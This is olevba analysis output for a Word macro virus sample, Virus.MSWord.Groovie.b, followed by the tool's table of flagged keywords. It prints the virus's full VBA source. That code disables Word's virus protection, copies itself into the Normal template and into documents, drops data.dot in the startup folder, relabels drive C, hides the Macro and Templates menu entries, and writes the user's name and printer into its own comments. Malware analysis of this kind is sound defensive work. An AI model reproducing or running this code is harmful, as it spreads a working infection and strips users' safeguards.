olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Groovie.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Groovie.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO orbit.bas 
in file: ./Virus.MSWord.Groovie.b - OLE stream: 'Macros/VBA/orbit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Public I02 As Boolean
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Public I03 As Boolean
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Public I04 As Boolean
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Public I05 As Boolean
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Public I06 As String
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Public I07 As Boolean
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Public I08 As Boolean
 ' JdR6-4-00 14:26:49980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I09()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If MacroContainer = NormalTemplate Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        I01 = "normal"
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        GoTo checkout
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
checkout:
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I10()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Next I
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Next I
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I11()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I09
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I10
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I01 = "document" Then Call I12
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I01 = "normal" Then Call I13
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I01 = "orbit" Then Call I14
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I12()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I03 = False And I05 = False Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        With NormalTemplate.VBProject
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I02 = False Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Shell ("label c: groovie"), 0
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Windows(1).Close
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I13()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Application.ScreenUpdating = False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Call I17
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I04 = False And I07 = True Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        With ActiveDocument.VBProject
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            .Execute
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I02 = False And I07 = True Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If I02 = False And I07 = False Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Application.ScreenUpdating = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I14()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Application.ScreenUpdating = False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If I03 = False And I05 = False Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            With NormalTemplate.VBProject
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            NormalTemplate.Save
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        If I04 = False Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            With ActiveDocument.VBProject
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
                .Execute
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
            End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Application.ScreenUpdating = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I15()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Options.VirusProtection = False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Options.SaveNormalPrompt = False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Options.ConfirmConversions = False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    I06 = ActiveDocument.FullName
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    Call I11
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub AutoOpen()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I15
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub AutoClose()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
I08 = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I15
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub AutoExit()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I15
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub FileSaveAs()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I16
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I15
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub filesave()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I16
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I15
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub fileclose()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
I08 = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I15
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
ActiveDocument.Close
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub fileprint()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error Resume Next
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Call I15
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub viewvbcode()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub ToolsMacro()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Sub FileTemplates()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Sub
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I17()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
On Error GoTo docek
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    If ActiveDocument.Name <> "" Then
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
        I07 = True
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    End If
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    GoTo over
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
docek:
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
    I07 = False
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
over:
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Function I16()
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Randomize
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
rn = Int(Rnd * 999)
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
For x = 2 To 358 Step 2
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
.deletelines x
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
Next x
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End With
 ' JdR6-4-00 14:26:50980Josine de Ruiter980HP DeskJet 710C on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

